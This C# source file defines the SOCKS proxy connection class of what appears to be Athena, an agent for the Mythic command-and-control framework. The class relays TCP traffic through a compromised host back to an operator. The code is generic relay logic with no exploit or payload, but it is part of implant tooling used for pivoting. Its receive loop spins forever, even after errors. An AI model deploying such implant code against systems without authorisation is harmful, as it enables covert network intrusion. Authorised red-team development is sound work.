using Athena.Commands.Model;
using Athena.Models.Athena.Socks;
using Athena.Models.Mythic.Response;
using Athena.Utilities;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using TcpClient = Athena.Models.Athena.Socks.TcpClient;

namespace Athena.Commands
{
    public class SocksConnection : TcpClient
    {
        public byte[] dstportBytes { get; set; }
        public byte[] dstBytes { get; set; }
        public byte[] bndPortBytes { get; set; }
        public byte[] bndBytes { get; set; }
        public byte addressType { get; set; }
        public int server_id { get; set; }
        public bool listening { get; set; }

        public SocksConnection(ConnectionOptions co) : base(co.ip, co.port)
        {
            this.dstBytes = co.dstBytes;
            this.dstportBytes = co.dstportBytes;
            this.bndPortBytes = co.bndPortBytes;
            this.bndBytes = co.bndBytes;
            this.addressType = co.addressType;
            this.server_id = co.server_id;
        }

        protected override void OnReceived(byte[] buffer, long offset, long size)
        {
            Misc.WriteDebug($"[{server_id}] OnReceived");
            Misc.WriteDebug($"{size} bytes received.");
            SocksMessage smOut = new SocksMessage()
            {
                server_id = this.server_id,
                data = Misc.Base64Encode(buffer),
                exit = false
            };

            Globals.socksHandler.ReturnMessage(smOut);
        }
        protected override void OnError(SocketError error)
        {
            Misc.WriteError($"TCP client caught an error with code {error}");
        }

        protected override void OnConnected()
        {
            Misc.WriteDebug($"TCP client connected a new session with Id {Id}");
        }

        protected override void OnDisconnected()
        {
            SocksMessage smOut = new SocksMessage()
            {
                server_id = this.server_id,
                data = "",
                exit = true
            };

            Globals.socksHandler.ReturnMessage(smOut);
        }
        public async void StartReceiveAsync()
        {
            this.listening = true;
            bool test;
            while (true)
            {
                try
                {
                    test = this.ReceiveAsync().Result;
                }
                catch
                {
                    this.listening = false;
                }
            }
        }
    }
}
